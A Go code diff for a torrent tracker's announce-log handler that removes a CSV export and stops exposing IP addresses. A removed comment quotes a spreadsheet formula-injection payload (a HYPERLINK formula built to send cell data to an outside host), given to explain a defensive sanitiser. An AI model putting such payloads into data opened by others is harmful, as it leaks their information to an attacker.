@@ -1,13 +1,9 @@
 package handler
 
 import (
-	"encoding/csv"
 	"encoding/hex"
-	"fmt"
-	"log/slog"
 	"net/http"
 	"strconv"
-	"time"
 
 	"github.com/go-chi/chi/v5"
 
@@ -21,24 +17,19 @@ import (
 // account's response bounded.
 const announceLogMonthsShown = 120
 
-// announceLogExportPage is how many rows the export pulls per round trip. The
-// response is streamed, so this bounds memory rather than the export's size.
-const announceLogExportPage = 1000
-
 // defaultAnnounceLogRetentionDays mirrors what migration 052 seeded and what the
 // maintenance worker falls back to. Kept in step with cmd/server's
 // announceLogRetention: the number this endpoint reports is the number the prune
 // acts on.
 const defaultAnnounceLogRetentionDays = 90
 
-// AnnounceLogHandler serves a member's own announce log: the raw rows the tracker
-// recorded about their client, the monthly totals that outlive them, and a CSV
-// export of the lot.
+// AnnounceLogHandler serves a member's announce log: the raw rows the tracker
+// retained about their client, plus the monthly totals that outlive them.
 //
-// The log holds IP addresses and peer IDs, which makes it personal data — so a
-// member being able to see and take away what is stored about them is an
-// obligation, not a nicety. Staff see it too, because "your client reported this"
-// is the evidence in every ratio dispute.
+// This exists for ratio disputes — "your client reported this" is the evidence in
+// every one of them — which is why staff can read it as well as the member. It is
+// deliberately read-only and on-screen: there is no bulk export, and the tracker
+// does not record announce IP addresses at all (see migration 080).
 type AnnounceLogHandler struct {
 	events   repository.AnnounceEventRepository
 	rollups  repository.AnnounceRollupRepository
@@ -107,121 +98,10 @@ func (h *AnnounceLogHandler) HandleList(w http.ResponseWriter, r *http.Request) 
 	})
 }
 
-// HandleExport handles GET /api/v1/users/{id}/announce-log/export — the whole
-// retained log as CSV.
-func (h *AnnounceLogHandler) HandleExport(w http.ResponseWriter, r *http.Request) {
-	userID, ok := h.authorize(w, r)
-	if !ok {
-		return
-	}
-
-	// Written before the first row so a failure mid-stream is the only case that
-	// can produce a truncated file, rather than an HTML error inside a .csv.
-	filename := fmt.Sprintf("announce-log-%d.csv", userID)
-	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
-	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
-	w.WriteHeader(http.StatusOK)
-
-	cw := csv.NewWriter(w)
-	defer cw.Flush()
-
-	if err := cw.Write([]string{
-		"announced_at", "torrent_id", "torrent_name", "event", "ip", "port", "peer_id",
-		"uploaded", "downloaded", "left_bytes",
-		"uploaded_delta", "downloaded_delta", "counted_downloaded_delta", "seeder",
-	}); err != nil {
-		slog.Error("announce log export: failed to write header", "user_id", userID, "error", err)
-		return
-	}
-
-	// Keyset paging, oldest first: an export is a walk, and OFFSET would re-scan
-	// everything already written on each page.
-	var afterID int64
-	for {
-		batch, err := h.events.PageByUser(r.Context(), userID, afterID, announceLogExportPage)
-		if err != nil {
-			// Headers are already sent, so the client sees a short file. Logged
-			// rather than swallowed: a silently truncated data export is worse than
-			// a failed one.
-			slog.Error("announce log export: failed to page events",
-				"user_id", userID, "after_id", afterID, "error", err)
-			return
-		}
-		if len(batch) == 0 {
-			return
-		}
-
-		for i := range batch {
-			e := &batch[i]
-			torrentID := ""
-			if e.TorrentID != nil {
-				torrentID = strconv.FormatInt(*e.TorrentID, 10)
-			}
-			if err := cw.Write([]string{
-				e.AnnouncedAt.UTC().Format(time.RFC3339),
-				torrentID,
-				csvCell(e.TorrentName),
-				csvCell(e.Event),
-				e.IP,
-				strconv.Itoa(e.Port),
-				// Hex, because a peer ID is arbitrary bytes: clients put raw
-				// binary in it, and pasting that into a CSV cell would corrupt
-				// the row.
-				hex.EncodeToString(e.PeerID),
-				strconv.FormatInt(e.Uploaded, 10),
-				strconv.FormatInt(e.Downloaded, 10),
-				strconv.FormatInt(e.LeftBytes, 10),
-				strconv.FormatInt(e.UploadedDelta, 10),
-				strconv.FormatInt(e.DownloadedDelta, 10),
-				strconv.FormatInt(e.CountedDownloadedDelta, 10),
-				strconv.FormatBool(e.Seeder),
-			}); err != nil {
-				slog.Error("announce log export: failed to write row",
-					"user_id", userID, "event_id", e.ID, "error", err)
-				return
-			}
-			afterID = e.ID
-		}
-
-		// Flush per batch so a long export streams instead of buffering entirely.
-		cw.Flush()
-		if err := cw.Error(); err != nil {
-			slog.Error("announce log export: failed to flush", "user_id", userID, "error", err)
-			return
-		}
-
-		if len(batch) < announceLogExportPage {
-			return
-		}
-	}
-}
-
-// csvCell neutralises a leading character that a spreadsheet would read as the
-// start of a formula.
-//
-// The point of this export is that someone opens it in Excel or LibreOffice, which
-// is exactly what makes it dangerous: a torrent name is chosen by its uploader and
-// appears in the export of every member who ever announced on it — including staff,
-// who can export anyone's. `=HYPERLINK("http://…"&A1,"invoice")` in a name would
-// otherwise become a live link in a stranger's spreadsheet, carrying that
-// stranger's own IP address out with it.
-//
-// A leading apostrophe is the conventional fix: spreadsheets treat the cell as
-// text, and the CSV writer quotes it so the value survives a round trip.
-func csvCell(s string) string {
-	if s == "" {
-		return s
-	}
-	switch s[0] {
-	case '=', '+', '-', '@', '\t', '\r':
-		return "'" + s
-	}
-	return s
-}
-
 // authorize resolves the target member from the URL and enforces owner-or-staff.
-// Same gate as the activity tabs: this is a member's own transfer detail, and one
-// member reading another's announce log would be reading their IP addresses.
+// Same gate as the activity tabs: this is a member's own transfer detail, and the
+// per-announce byte deltas are exactly what a rival would want in order to work out
+// what someone is seeding and when they are online.
 func (h *AnnounceLogHandler) authorize(w http.ResponseWriter, r *http.Request) (int64, bool) {
 	viewerID, _ := middleware.UserIDFromContext(r.Context())
 	viewerPerms := middleware.PermissionsFromContext(r.Context())
@@ -263,7 +143,6 @@ func announceEventJSON(e *repository.AnnounceEventWithTorrent) map[string]interf
 		"torrent_id":               e.TorrentID,
 		"torrent_name":             e.TorrentName,
 		"event":                    e.Event,
-		"ip":                       e.IP,
 		"port":                     e.Port,
 		"peer_id":                  hex.EncodeToString(e.PeerID),
 		"uploaded":                 e.Uploaded,
